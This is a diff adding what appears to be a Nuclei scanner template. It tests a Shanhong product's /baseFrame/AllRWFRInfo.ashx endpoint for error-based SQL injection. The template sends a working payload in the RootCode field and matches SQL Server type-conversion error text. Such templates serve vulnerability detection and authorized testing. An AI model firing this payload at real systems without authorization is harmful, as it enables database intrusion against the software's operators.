@@ -1,0 +1,28 @@
+id: shanhong-AllRWFRInfo-sqlInjection
+
+info:
+  name: shanhong-AllRWFRInfo-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    shanhong-AllRWFRInfo-sqlInjection
+
+http:
+  - raw:
+      - |
+        POST /baseFrame/AllRWFRInfo.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"REQSID":{"Ex":null,"UserID":"Admin","RESID":"65880587","UserGrade":1},"ReqParas":{"RootCode":"520000000000000'and @@version>1--","Ext":""},"DataType":"object","ModelID":"AllRWFRInfo"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "nvarchar"
+          - "转换成数据类型"
+        condition: and
